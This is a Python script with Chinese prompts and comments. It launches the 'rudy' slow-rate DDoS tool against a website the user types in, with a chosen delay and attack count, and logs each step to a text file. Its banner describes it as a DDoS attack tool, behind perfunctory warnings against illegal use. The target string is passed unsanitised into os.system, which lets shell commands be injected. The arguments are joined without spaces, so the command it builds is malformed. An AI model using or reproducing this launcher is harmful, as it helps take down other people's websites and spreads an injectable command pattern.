import datetime
import requests
import re
import os
import threading
import queue
import time
import os
# 导入urlopen
from urllib.request import urlopen
# 导入BeautifulSoup
from bs4 import BeautifulSoup as bf
# 导入urlretrieve函数，用于下载图片
from urllib.request import urlretrieve

now = datetime.datetime.now()
other_StyleTime = now.strftime("%Y-%m-%d %H:%M:%S")
Note=open("use/Reptile.txt",mode='a')
Note.write('时间:['+other_StyleTime)
Note.write(']---root用户使用了rudyjs攻击器\n')
Note.close()
print ("\033[1;33;40m ")
print("____            _   _ _            _ _____ _  __")
print("|  _ \ ___ _ __ | |_(_) | ___      | |_   _| |/ /")
print("| |_) / _ \ '_ \| __| | |/ _ \  _  | | | | | ' /")
print("|  _ <  __/ |_) | |_| | |  __/ | |_| | | | | . \ ")
print("|_| \_\___| .__/ \__|_|_|\___|  \___/  |_| |_|\_\ ")
print("           |_|                                   ")
print("rudyjs")
print("rudyjs-低速DDOS攻击工具，该工具为第三方工具，非金条k所建，请认准原作者，退出该脚本后，你也可以使用命令 'rudy' 查看该工具的详细信息和使用教程，输入基本信息后，等待片刻，如果出现了数字，则开始攻击，若出现一直不断乱码，则攻击失败\n使用规则:\n该工具严禁用于非法攻击！严禁用于犯罪！严禁用于违法！严禁用于损害他人和社会！严禁攻击正规网站！严禁攻击国防网站！否则后果自负！后果自负！后果自负！\n")

xx = input("请输入你想要攻击的网站:   ")

Note=open("use/Reptile.txt",mode='a')
Note.write('时间:['+other_StyleTime)
Note.write(']---root用户输入的网站为:'+xx)
Note.close()

aa = input("请填写攻击多少延迟:  ")

Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---root用户输入的延迟为:'+aa)
Note.close()

dd = input("请填写攻击数量:  ")

Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---root用户输入的数量为:'+dd)
Note.close()

Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---开始运行rudyjs\n')
Note.close()
print("开始跳转工具")
cc = "-d "+aa
qq = "-n"+dd
mm = "-m GET"
Note=open("use/Reptile.txt",mode='a')
Note.write('\n时间:['+other_StyleTime)
Note.write(']---开始准备攻击\n')
Note.close()
os.system('rudy -t '+xx +cc +qq +mm)
print("开始准备攻击，请等待！")